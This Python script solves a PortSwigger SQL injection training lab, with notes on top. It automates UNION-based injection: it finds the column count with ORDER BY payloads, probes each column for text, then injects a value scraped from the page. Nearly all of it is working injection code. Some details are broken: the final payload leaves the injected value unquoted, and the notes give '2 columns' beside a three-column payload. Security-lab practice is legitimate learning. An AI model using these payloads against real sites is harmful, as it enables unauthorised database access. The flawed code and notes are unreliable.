'''
Notes: 

Link: https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text 

1. Vulnerability:  Product Category FIlter (SQLi)

2. Goal: 1. Determine the No. of Columns 
         2. Determine the data type of Columns 
         3. Make the Database retrieve the data (Final Goal)

3 Analysis: 1.
                WAY No 1. Find The Number of Columns # Union Command (' UNION SELECT NULL--)
                    - 2 columns (' UNION SELECT NULL, NULL, NULL--) #(Error in ' UNION SELECT NULL, NULL, NULL, NULL--)
                WAY No 2. Find The Number of Columns # Order by Command (' ORDER BY 1-)
                    - 3 columns (' ORDER BY 3--) (Error in 'ORDER BY 4--)
            
            2.  ' UNION SELECT 'a', NULL, NULL-- # Error
                ' UNION SELECT NULL, 'a', NULL-- # Works
                ' UNION SELECT NULL, NULL, 'a'-- # Error 


4. Exploit: ;)



Code reference: https://github.com/rkhal101/Web-Security-Academy-Series/blob/main/sql-injection/lab-04/sqli-lab-04.py

'''


import requests
from bs4 import BeautifulSoup
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Helper to send the payload and get the response
def payload_sender(url, uri, payload):
    try:
        r = requests.get(url + uri + payload, verify=False, proxies=proxies)
    except:
        r = requests.get(url + uri + payload, verify=False)
    return r.text

# Find the number of columns by using 'ORDER BY'
def exploit_sqli(url):
    uri = '/filter?category=Gifts'
    try:
        r = requests.get(url + uri, verify=False, proxies=proxies)
    except:
        r = requests.get(url + uri, verify=False)

    print("-"*40+"\n[*] Way 2: Using Order BY Command")
    
    count = 1
    while True:
        payload_orderby = f"' ORDER BY {count}--"
        r = payload_sender(url, uri, payload_orderby)
        print(f"Tried the count value -> {count}")
        print(f"Way 2: Payload -> {payload_orderby}")

        if "Internal Server Error" in r:
            print(f"[-] Error found at column {count}, returning count - 1.")
            return count - 1
        else:
            count += 1

# Test for text-accepting columns using 'a' to determine column data types
def exploit_vulnerability(url, uri, num_columns):
    for i in range(1, num_columns + 1):
        # Build a UNION SELECT payload and test each column with a string 'a'
        payload_list = ['NULL'] * num_columns
        payload_list[i - 1] = "'a'"
        payload_union = "' UNION SELECT " + ','.join(payload_list) + "--"
        
        print(f"Trying Payload for Column {i}: {payload_union}")
        r = payload_sender(url, uri, payload_union)

        if "Internal Server Error" not in r:
            print(f"[+] Column {i} accepts TEXT data.")
            return i
        else:
            print(f"[-] Column {i} does not accept TEXT data.")
    return None

# New function to send the secret to the column that accepts TEXT
def solve_lab(url):
    uri = '/filter?category=Gifts'

    # Step 1: Find the number of columns using the ORDER BY approach
    num_columns = exploit_sqli(url)
    if not num_columns:
        print("[-] Unable to find the number of columns!")
        return
    
    print(f"[+] The Number of column(s) are {num_columns}")
    
    # Step 2: Retrieve the secret from the page
    try:
        r = requests.get(url + uri, verify=False, proxies=proxies)
    except:
        r = requests.get(url + uri, verify=False)
        
    soup = BeautifulSoup(r.text, 'html.parser')
    hint = soup.find('p', id='hint')
    
    if not hint:
        print("[-] Could not find the hint element in the response.")
        return

    secret = hint.text.split(": ")[1].strip()
    print(f"[+] Retrieved secret: {secret}")

    # Step 3: Find the column that accepts TEXT using 'a' probing
    text_col_index = exploit_vulnerability(url, uri, num_columns)
    if text_col_index is None:
        print("[-] Could not find a column that accepts TEXT!")
        return

    # Step 4: Send the secret to the server using the detected text column
    payload_list = ['NULL'] * num_columns
    payload_list[text_col_index - 1] = f"{secret}"
    payload_union = "' UNION SELECT " + ','.join(payload_list) + "--"

    print(f"[+] Sending secret to column {text_col_index} with payload: {payload_union}")
    r = payload_sender(url, uri, payload_union)

    if "Internal Server Error" not in r:
        print("[+] Successfully solved the lab!")
    else:
        print("[-] Failed to solve the lab!")

# Main function
if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        #Edit The url
        url = 'https://0ac3000304f3b80481e352db002d00e5.web-security-academy.net'  # Update Domain here

    solve_lab(url)
